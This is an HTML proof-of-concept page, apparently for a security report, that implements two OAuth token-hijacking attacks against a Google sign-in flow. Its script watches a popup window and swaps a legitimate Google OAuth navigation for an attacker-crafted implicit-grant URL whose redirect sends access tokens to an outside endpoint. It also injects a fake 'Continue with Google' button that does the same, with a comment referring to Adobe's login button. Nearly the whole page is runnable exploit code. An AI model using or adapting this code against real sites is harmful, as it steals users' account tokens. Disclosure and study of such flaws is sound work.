<!DOCTYPE html>
<html>
<head>
    <title>OAuth COOP PoC</title>
    <style>
        body {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            background-color: #f2f2f2;
            font-family: Arial, sans-serif;
            padding: 20px;
        }
        img {
            width: 300px;
            height: auto;
            object-fit: contain;
        }
        button {
            padding: 10px 20px;
            margin: 10px;
            background-color: #4caf50;
            color: white;
            border: none;
            cursor: pointer;
            font-size: 16px;
        }
        #log {
            margin-top: 20px;
            background: #000;
            color: #0f0;
            padding: 10px;
            font-family: monospace;
            height: 200px;
            width: 90%;
            max-width: 600px;
            overflow-y: auto;
            text-align: left;
        }
    </style>
    <script>
        // Logger
        function log(msg) {
            document.getElementById("log").innerHTML += msg + "<br>";
        }

        // Build malicious OAuth URL
        function buildAttackURL() {
            let client_id = "50787447880-lej9pu0gkn41t1cacqcisjessmcrt9bf.apps.googleusercontent.com";
            let redirect_uri = "https://poc-coop.com/store.html"; // change to your endpoint
            let scope = "https://www.googleapis.com/auth/userinfo.profile";

            return "https://accounts.google.com/o/oauth2/v2/auth?" +
                "client_id=" + encodeURIComponent(client_id) +
                "&redirect_uri=" + encodeURIComponent(redirect_uri) +
                "&response_type=token" +
                "&scope=" + encodeURIComponent(scope);
        }

        // Helper: parse URL params
        function getParameterByName(name, url) {
            if (!url) url = window.location.href;
            name = name.replace(/[\[\]]/g, "\\$&");
            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
                results = regex.exec(url);
            if (!results) return null;
            if (!results[2]) return '';
            return decodeURIComponent(results[2].replace(/\+/g, " "));
        }

        // ---------------------------
        // 1. FRAME HIJACK ATTACK
        // ---------------------------
        let foo;
        let attackOAuthURL;

        function monitorNavigation() {
            if (!foo || foo.closed) {
                log("▶ Target window closed. Stopping monitor.");
                return;
            }

            try {
                let loc = foo.location.href;
                log("Monitoring: " + loc);

                if (loc.includes("accounts.google.com")) {
                    log("⚠ Detected Google OAuth flow, injecting malicious redirect...");
                    foo.location.replace(attackOAuthURL);
                    return;
                }
            } catch (e) {
                log("Cross-origin navigation detected, waiting...");
            }

            setTimeout(monitorNavigation, 800);
        }

        function launchHijack() {
            attackOAuthURL = buildAttackURL();
            let urlParam = getParameterByName('url');
            if (!urlParam) {
                log("❌ Missing ?url= parameter for victim flow.");
                return;
            }

            log("▶ Opening target: " + urlParam);
            foo = window.open(urlParam, "foo", "width=500,height=600,noopener,noreferrer");
            setTimeout(monitorNavigation, 2000);
        }

        // ---------------------------
        // 2. BASEURL REPLACEMENT ATTACK
        // ---------------------------
        function launchBaseURL() {
            let attackURL = buildAttackURL();
            log("▶ Overriding Google button with malicious OAuth flow.");

            // Simulate Adobe's Google login button replacement
            let fakeBtn = document.createElement("button");
            fakeBtn.innerText = "Continue with Google (Hijacked)";
            fakeBtn.style.backgroundColor = "#db4437";
            fakeBtn.onclick = function() {
                log("⚠ Redirecting victim to malicious OAuth flow...");
                window.location.href = attackURL;
            };

            document.body.appendChild(fakeBtn);
        }
    </script>
</head>
<body>
    <img src="https://media.tenor.com/HQEVMrJMMI0AAAAi/cat-cat-tutu.gif" alt="Funny cat">
    <button onclick="launchHijack()">Exploit (Frame Hijack)</button>
    <button onclick="launchBaseURL()">Exploit (BaseURL Replacement)</button>
    <div id="log"></div>
</body>
</html>
